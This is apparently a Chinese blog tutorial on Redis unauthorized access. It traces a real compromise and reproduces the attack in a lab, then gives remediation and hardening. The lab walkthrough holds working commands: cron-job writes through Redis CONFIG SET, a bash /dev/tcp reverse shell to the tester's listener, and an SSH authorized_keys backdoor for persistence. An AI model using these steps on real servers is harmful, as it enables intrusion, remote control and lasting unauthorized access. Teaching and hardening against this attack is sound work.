> :warning: 声明： 本文仅供学习交流使用，切勿用于非法用途 :warning:


## :hammer: 原理介绍

> **Redis 未授权访问** 准确的来说，其实并不是一个漏洞。而是由于开发人员配置不当，而产生的预料之外的危害。
> <br>
> 具体原理：
> 1. 可能由于部分业务要求，或者开发人员的配置不当，将 `redis` 服务器的 `ip` 和 `port` 暴露在公网上；
> 2. 开发人员未配置 `redis` 的访问口令（`redis` 默认是不需要口令的），或者配置了弱口令；
> 3. 攻击者通过爆破等方式，连接到 `redis` 终端，获取或者写入 `redis` 键值对。（*有部分开发人员会觉得自己项目 `redis` 中缓存了一部分不是很重要的公开数据，便没有重视 `redis` 的配置，也是 `redis` 未授权访问产生的重要原因之一*）；
> 4. 攻击者利用缓存持久化、反弹 shell、权限维持等技术，直接远控主机进行**任意操作**（*这便是上面提到的预料意外的危害，可能部分开发会觉得仅仅是泄露一些无关紧要的数据而已，而实际上，远不止于此，远控主机之后，一旦进入内网，便可以肆虐整个公司网络环境*）。

## :hammer: 产生前提

1. 业务要求或开发人员配置不当，将 `redis` 服务器的 `ip` 和 `port` 暴露在公网上；
	- `redis` 配置文件中注释了这一行代码（*本意为仅本地回环地址可访问，注释掉后意为不限制访问来源*）
		- `# bind 127.0.0.1`
	- `redis` 配置文件中关闭了保护模式（*默认是打开的，打开情况下只有本地回环地址可以访问，与 bind 配合使用*）；
		- `protected-mode : no`
	- 防火墙或安全组规则开放端口（入方向）开放 `redis` 端口，默认：6379
2. 开发人员未配置 `redis` 的访问口令（*默认是不配置的*）。
	- `# requirepass`

## :hammer: 场景还原（溯源）
接下来，我按照这个 **攻击产生前提** 对 aliyun 上的一台服务器进行配置。（下载 `redis` 的步骤就省略了）

1. 修改 `redis` 配置文件，关闭保护模式，关闭 ip 绑定；
	
	![请添加图片描述](https://img-blog.csdnimg.cn/ef9534e3c0734576ab444bcf8f011943.png)
2. 配置 aliyun 入口规则，开放 `redis` 默认端口 `6379` 的访问；

	![请添加图片描述](https://img-blog.csdnimg.cn/5eeb594d4cca4f81b3caec42782a30ce.png)
3. 等待一段时间（或许几十分钟，或许几个小时，或许一天，但一般不会超过 48 小时）

	![请添加图片描述](https://img-blog.csdnimg.cn/0a42af41e2234486b7fe6a89513f5335.gif)
4. 收到了来自 aliyun 官方的安全告警
	
	![请添加图片描述](https://img-blog.csdnimg.cn/3c0188c8af5c47f0a33a9f2b48be0836.png)
5. 连接 `redis` 终端，检查一下有什么变化？ 发现，在 `redis` 并未使用的情况下，多出了 4 个 名为 `backup` 的 `key`，查看 `backup1` 的 `value` 发现疑似一个 `cron` 定时任务指向一个 url 地址，地址中包含的是一个 `sh` 的脚本。

	![请添加图片描述](https://img-blog.csdnimg.cn/03de27bea7bd4dd9a66b5ce2dba748c5.png)
6. 访问这个 `url` 地址获取 `sh` 脚本，进一步分析（:warning::warning::warning: <font color=red><b>危险：建议在虚拟机或者测试机器访问，不要在本地计算机访问</b></font> :warning::warning::warning:），我这里直接选择在 aliyun 服务器上访问，因为我这台服务器演示完这个场景后是准备重置的。

	![请添加图片描述](https://img-blog.csdnimg.cn/b948a847fc22496ab82379f8cdb8e109.png)
7. 查看其它 3 个 `backup` 键的值，可以看到指向的是同一个恶意脚本，只是访问的方式和参数的区别

	![请添加图片描述](https://img-blog.csdnimg.cn/2fee3af1298b40258ae60071fd7c846f.png)

8. 分析恶意脚本源码（由于脚本的性质，这里不做上传，需要的可以直接访问上面公网地址获取，切记不要在物理机访问），大致有三部分内容

	- 目录提权，命令伪造
	- 杀死防御进程，杀死竞争进程，下载指定脚本并执行（这里才是真正执行恶意代码逻辑的脚本）
	- 清理日志文件


## :hammer: 攻击原理分析
> 看了上面的溯源过程，可能会有一个疑问。
> <br>
> `redis` 被写入了四个 `key` 为 `backup`，值为疑似计划任务命令的键值对，这个很容易理解，因为 `redis` 暴露在公网且没有口令验证，被写入值很正常<br>
> 但是，这条计划任务是如何运行的？恶意脚本又是如何被下载的？

实际上，这里利用的是 `redis` 数据库中的数据持久化操作，使用动态命令将键值对信息持久化存储到磁盘的指定目录下，进而自动运行。具体如下：

1. 远程访问 `redis` ，写入 `key`、`value` 键值对。`key` 随意命名，`value` 为要执行的计划任务
	- 如： `* * * * * echo $(date) >> /root/data.txt`
	- 意为： 每分钟向 `/root/data.txt` 文件中追加一次时间
	- 在 `linux` 中，`cron` 只有 **分、时、日、月、周** 六位，没有秒级，如果需要以秒为单位，可以使用脚本或者 `sleep` 方法来配合实现
2. 动态配置 `redis` 文件持久化路径，并执行持久化命令
	- `config set dir /var/spool/cron/`
		- `/var/spool/cron` 这个目录是 `linux` 定时任务目录之一
	- `config set dbfilename root`
		- `root` root 对应的是 `/var/spool/cron` 定时任务目录下的子目录，该目录下的定时任务是以用户为纬度存储的，所以这里保存的目录名称应该是当前登录的用户名 root
	- `save`
		- 手动触发 `redis` 文件持久化
3. 等待计划任务自动触发

## :hammer: 攻击流程复现
> 这里的复现流程有一个前提：被攻击机的 `redis` 是使用 `root` 账户启动的。 如果不是 `root` 账户启动，可能后面的复现写入数据时会遇到各种各样的权限不足的问题。

### 1. 远程连接 `redis` 服务，写入定时任务
- `set backup "\n* * * * * echo $(date) >> /root/data.txt\n"`
	- 如果遇到 `MISCONF Redis is configured to save RDB snapshots, but it is currently not able to persist on disk. Commands that may modify the data set are disabled, because this instance is configured to report errors during writes if RDB snapshotting fails (stop-writes-on-bgsave-error option). Please check the Redis logs for details about the RDB error` 报错，在终端执行 `config set stop-writes-on-bgsave-error no` 即可（或者直接在 `redis.conf` 配置文件中改为 `stop-writes-on-bgsave-error no` 后重启 `redis` 服务也可以）

### 2. 动态配置 `redis` 的持久化路径和文件名，手动持久化，触发定时任务的保存

- `config set dir /var/spool/cron/`
	- 配置 `redis` 持久化文件存储路径为 `/var/spool/cron`。该目录是 `linux` 系统定时任务存储的目录之一
- `config set dbfilename root`
	- 配置 `redis` 持久化文件存储名称为 `root`。 该文件是 `root` 用户创建的定时任务存储的文件之一
- `save`
	- 手动触发 `redis` 持久化

- 过程如图


	![在这里插入图片描述](https://img-blog.csdnimg.cn/1e140e14b48e46c1bfa6a8ad76ab01ca.png)



### 3. 等待几分钟之后，进入虚拟机（被攻击机）查看效果

- `crontab -u root -l` 查看已有的计划任务
	- 其他 `crontab` 命令
           - `crontab -u root -r`：删除某个用户的定时任务
           - `crontab -u root -time.cron`：把文件添加到某个用户的定时任务（time.cron 是一个文本文件名，文本的内容是一个或者多个 cron 表达式）
           - `crontab -u root -l`：列举某个用户的定时任务
           - `crontab -u root -e`：编辑某个用户的定时任务

- `tail -f /root/data.txt` 实时查看 `/root/data.txt` 文件内容（*这个文件就是上面计划任务中 echo 命令指向的文件，如果有每分钟输出一次时间，就说明计划任务创建成功了*）
- 过程如图（可以看到，成功了:v:）：

![在这里插入图片描述](https://img-blog.csdnimg.cn/7b30070d6c9d4b569bbf86418cd8c390.png)


### 4. （进阶）定时任务反弹 shell 获取权限

> 以上，其实 Redis 未授权访问产生的原理与造成的危害已经显而易见了。但是，上面最终仅仅是实现了在目标机器中创建一个文件并写入了一些内容，而可造成的危害远不仅于此... :see_no_evil:

> 既然可以创建文件，并写入文本，那说明，其实已经可以让目标机器执行一些自定义指令了，可以尝试实现远控。

1. 在本机开启一个监听端口 `8888` （这个端口随便定义，只要不冲突就行）

	- `nc -lvp 8888` 开始监听 `8888` 端口
		- `nc` 是 `netcat`工具的命令，大多数 `linux` 系统自带 `netcat`， windows 机器可以在官网（ `https://eternallybored.org/misc/netcat/` ）下载，记得关闭杀软或者加入白名单。
	- 如图
	![在这里插入图片描述](https://img-blog.csdnimg.cn/a38f7afb966942028692ff5e3f559b3a.png)

2. 重新打开一个命令行窗口（监听窗口不要关），按照上面攻击复现的步骤 1 ~ 3，在目标机器的定时任务中写入反弹`shell`脚本，并等待其执行（执行成功后，监听窗口会有变化）。

	-  连接 `redis`。（`133` 是我的 redis 服务器）
		- `redis-cli.exe -h 192.168.136.133`
	- 写入键值对，值为定时任务，1 分钟后执行反弹 `shell` 命令
		- `set x "\n\n* * * * * bash -i >& /dev/tcp/192.168.136.1/8888 0>&1\n\n"`
		- `\n` 是换行符，目的是为了与之前已经存在的定时任务分行
		- `bash -i >& /dev/tcp/192.168.136.1/8888 0>&1` 是最基本的 `bash` 反弹连接命令，`136.1` 是我本机的 ip 地址，`8888` 是上一步中设置的监听端口。
	- 修改 `redis` 持久化存储目录和文件名，触发持久化（`config set` 是动态持久化，仅在当前窗口生效，窗口关闭后需要重新设置）
		- `config set dir /var/spool/cron/`
		- `config set dbfilename root`
		- `save`
	- 过程如图
		![在这里插入图片描述](https://img-blog.csdnimg.cn/e606eecae5d54711a7dacbecb051abe1.png)

3. 打开第一步中的监听窗口，等待一小会儿 :clock5:（一分钟之内）

	- `shell` 反弹成功，本机已经成功远程连接目标机器

		![在这里插入图片描述](https://img-blog.csdnimg.cn/e0a87904c25446ce8fff4147fbbbbec0.png)

	- 执行两个命令证实一下，可以看到，此时的监听窗口已经连接上了远程机器的终端，并且可以返回了系统版本与当前用户名。
	
		![在这里插入图片描述](https://img-blog.csdnimg.cn/c5cb436dcc5542998a6b03415d0ff501.png)


### 5. （进阶）SSH key 免密登录，权限维持

> 在第 4 步中，已经成功的进入了目标主机，但是我们是借用 `redis` 未授权访问的漏洞才成功的，如果定时任务被维护人员发现并删除了呢？如果 `redis` 的配置被修复了，无法通过远程访问 `redis` 了呢？

> 思来想去，决定留一个后门，方便后期随时进入目标主机。

1. 本机生成 `ssh key` 公私钥对。
	- `ssh-keygen` 命令是用来生成 `ssh key` 公私钥对的。
		- 这个命令需要安装 `ssh` 才可以使用，`git` 中也集成了 `ssh`，如果电脑中装过 git 的也可以直接使用。
		- 公私钥对是最常见的一种免密登录验证方式，大名鼎鼎的 `github` 的免密登录使用的就是这种。
		- 基本原理也比较简单，就是通过加密算法，生成两个文件，一个公钥，一个私钥，两个是配套的，然后将公钥发送给目标主机存储起来，后续如果客户机想访问目标机器时，直接带着私钥去访问目标主机，目标主机经过核对，公私钥配套成功，就可以直接可以访问而不需要在输密码了。![在这里插入图片描述](https://img-blog.csdnimg.cn/9a458ced1bd1490c80895f5d059c695c.png)

2. 在存储路径下，找到公钥，用记事本打开，复制文本内容

	![在这里插入图片描述](https://img-blog.csdnimg.cn/4db3931782fe42279946263d3d7963ae.png)

3. 打开第 4 步中反弹连接的窗口（在第 4 步中，已经成功连接到目标主机），在目标主机上创建 `ssh` 文件并写入公钥

	- 进入远程主机的 `ssh key` 存储路径（`/root/.ssh`）如果没有 `.ssh` 文件，就创建一个
		- `cd /root`
		- `mkdir .ssh`
		- `ls -a`  因为 `.ssh` 是隐藏文件，所以使用 ` -a ` 参数
		- `cd .ssh`
		- `echo "ssh-rsa AAAAABBBBCCCCXXXXX " >> authorized_keys` 
			- 引号中的是生成的公钥信息，更换成自己的
			- `authorized_keys` 是 `linux` 中用来存储授权信息的文件
	- 如图
	
		![在这里插入图片描述](https://img-blog.csdnimg.cn/6943e044623449f4b1bcc0818b392311.png)

4. 关闭监听窗口，新开一个窗口，免密登录远程机器

	- ssh 携私钥免密登录远程机器
		- `ssh -i ./id_rsa root@192.168.136.133`
			- 这里 `./id_rsa` 是私钥的位置，因为我是进入到 `.ssh` 目录中执行 `ssh` 命令的，`./` 代表当前目录
	- 可以看到直接登录成功（如果出现警告，直接输入 `yes` 回车即可）
	- 尝试执行几条命令验证结果，可以看到，机器 `ip` 是 `133` 远程主机，用户是 `root`
	- 这样，即使 `redis` 更新了配置文件，我们也可以通过 `ssh` 免密登录对主机进行远控。
	- 如图
	![在这里插入图片描述](https://img-blog.csdnimg.cn/9ccf281fb3a44e72957f54ac37162503.png)

## :hammer: 修复与加固方案

### 问题修复（只针对上述案例，真实场景中更复杂）
1. 端口排查，先检查是否有可疑端口在与主机建立连接，如有，将其 `kill`（案例中是使用 `bash` 连接的）
![在这里插入图片描述](https://img-blog.csdnimg.cn/1b822e343d1f4312a46fc4b8708a798b.png)
2. 检查定时任务、服务、自启程序等，可以配合日志一起检查，如果发现可疑的任务，将其终止
	![在这里插入图片描述](https://img-blog.csdnimg.cn/53322d286dbf422aaa7f63ce31145e46.png)
3. 检查 `.ssh` 文件，是否有可疑的认证凭据，如有，将其删除

	![在这里插入图片描述](https://img-blog.csdnimg.cn/51948fdf31db48fdaa5f22656a7c5c95.png)


4. 对 `redis` 进行加固（访问限制、密码配置等）
5. 复查定时任务、服务、自启程序、日志、端口（一定要复查，防止在删除凭证，对 redis 加固期间，恶意程序进行转移和复活）

### Redis 加固
> 就本案例而言，归根结底，后面一系列危害的根本原因还是 `redis` 配置不当，暴露于外网并且无口令验证。

1. 限制 `redis` 访问 `ip`。（通常 `redis` 都是在内网环境，很少暴露在外网，如果业务需求一定要外网访问，可以配置白名单管控），这是摘自 `redis` 官网【安全配置】中的一段话。

	> Security model
    > Redis is designed to be accessed by trusted clients inside trusted environments. This means that usually it is not a good idea to expose the Redis instance directly to the internet or, in general, to an environment where untrusted clients can directly access the Redis TCP port or UNIX socket.

2. 修改默认端口。将 `redis` 的默认端口 `6379` 修改为其他端口，从一定程度上也可以降低一定的风险，但并不能完全避免。

3. 配置访问口令。`redis` 默认是不需要口令的，但是为了安全起见，还是建议配置口令，并且要避免弱口令。

4. 配置专用用户。满足权限最小化原则，专项业务专人管理，配置单独的管理账号（尤其不要使用 `root` 账户运行）

